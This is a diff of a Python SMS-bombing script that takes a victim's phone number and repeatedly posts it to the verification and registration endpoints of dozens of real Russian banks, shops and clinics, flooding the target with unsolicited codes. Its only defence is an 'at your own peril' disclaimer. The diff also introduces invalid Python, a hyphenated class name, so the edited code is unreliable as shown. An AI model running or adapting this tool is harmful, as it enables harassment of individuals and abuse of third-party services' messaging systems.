@@ -1,35 +1,35 @@
 #!/usr/bin/python3
-# spammer v0.2 beta
+# spammer v0.3 beta
 # Author: @Mrxanon and @Krolikmerzavec
-class Bomber:
+class Pomegranate-Bomber:
 	def main(self):
 		import requests, random, datetime, sys, time, argparse, os
 		from colorama import Fore, Back, Style
 		os.system("clear")
 		print(Fore.GREEN + '''
-#####################################
-#####################################
-######8888888888888888888888888######
-######8888888888888888888888888######
-######888        888        888######
-######888  8888  888  8888  888######
-######888  8888  888  8888    8######
-######888  8888  888  8888  888######
-######888        888        888######
-######888  888888888  8888  888######
-######888  888888888  8888    8######
-######888  888888888  8888  888######
-######888  888   888        888######
-######8888888888888888888888888######
-######8888888888888888888888888######
-######8888    @Mrxanon     8888######
-######8888 @Krolikmerzavec 8888######
-######8888   SMS Spammer   8888######
-######8888   v.0.2 (beta)  8888######
-######8888888888888888888888888######
-######8888888888888888888888888######
-#####################################
-#####################################'''+Style.RESET_ALL+Fore.BLUE+'''
+#############################################
+#############################################
+##########8888888888888888888888888##########
+##########8888888888888888888888888##########
+##########888        888        888##########
+##########888  8888  888  8888  888##########
+##########888  8888  888  8888    8##########
+##########888  8888  888  8888  888##########
+##########888        888        888##########
+##########888  888888888  8888  888##########
+##########888  888888888  8888    8##########
+##########888  888888888  8888  888##########
+##########888  888   888        888##########
+##########8888888888888888888888888##########
+##########8888888888888888888888888##########
+##########8888    @Mrxanon     8888##########
+##########8888 @Krolikmerzavec 8888##########
+##########8888   SMS Spammer   8888##########
+##########8888   v.0.3 (beta)  8888##########
+##########8888888888888888888888888##########
+##########8888888888888888888888888##########
+#############################################
+#############################################'''+Style.RESET_ALL+Fore.BLUE+'''
 
 Before you start using this utility,
 we want to say - that you do everything at your own peril and risk.
@@ -37,7 +37,7 @@ We are not responsible for what you do with this utility.
 ''')
 
 		print(Style.RESET_ALL)
-		parser = argparse.ArgumentParser(prog='spammer', description="Maybe something is no longer working.",epilog='Telegram- @Mrxanon and @Krolikmerzavec')
+		parser = argparse.ArgumentParser(prog='Pomegranate-Bomber', description="Maybe something is no longer working.",epilog='Telegram- @Mrxanon and @Krolikmerzavec')
 		parser.add_argument('phonenum', metavar='phone', help='Victims phone number (example: 79991234455)')
 		args = parser.parse_args()
 		_phone = args.phonenum
@@ -81,13 +81,13 @@ We are not responsible for what you do with this utility.
 			username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
 		iteration = 0			
 		_phone9 = _phone[1:]
-		_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] #+7+(915)350-99-08
-		_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10] #915+350-99-08
-		_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '+7+(915)350-99-08'
-		_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11] # '+7 (915) 350 99 08'
-		_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '915) 350-99-08'
+		_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
+		_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
+		_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
+		_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
+		_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
 		print(showstatus(wrapsbrace('info', True) + ('SMS sending to: +{}').format(_phone)))
-		print('Spammer launched.\nIf you want to stop, press "Ctrl + Z".')
+		print('Spammer launched.\nIf you want stop, press "Ctrl + Z".')
 		i = 1
 		iteration = 0
 		while i < 2:
@@ -163,7 +163,7 @@ We are not responsible for what you do with this utility.
 				requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': _phone,'g-recaptcha-response': '','recaptcha': 'on'})
 				requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
 				requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
-				requests.posMrxt('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
+				requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
 				requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
 				requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
 				requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
@@ -200,5 +200,5 @@ We are not responsible for what you do with this utility.
 				print(('{} Circle passed.').format(iteration))
 			except:
 				pass
-spammer = Bomber()
+spammer = Pomegranate-Bomber()
 spammer.main()
